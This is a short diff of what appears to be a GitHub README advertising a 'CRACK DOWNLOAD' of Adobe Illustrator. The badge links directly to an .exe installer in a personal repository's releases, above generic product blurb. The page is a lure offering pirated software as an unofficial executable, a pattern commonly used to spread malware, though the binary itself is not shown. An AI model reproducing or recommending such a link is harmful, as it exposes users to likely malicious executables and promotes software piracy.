@@ -4,7 +4,7 @@
 
 
 
-[<img src="https://img.shields.io/badge/Adobe-Illustrator-CRACK-DOWNLOAD-blue?style=for-the-badge">](https://github.com/arsham129/Adobe-Illustrator-Full-2024-2025/releases/download/2/installer-Adobe-Illustrator.exe)
+[<img src="https://img.shields.io/badge/Adobe-Illustrator CRACK-DOWNLOAD-blue?style=for-the-badge">](https://github.com/arsham129/Adobe-Illustrator-Full-2024-2025/releases/download/2/installer-Adobe-Illustrator.exe)
 
 
 ### Adobe Illustrator is a leading vector graphic design software that enables designers to create intricate illustrations, logos, and artwork. Whether you're a beginner or a seasoned professional, Illustrator provides powerful tools to bring your artistic ideas to life.
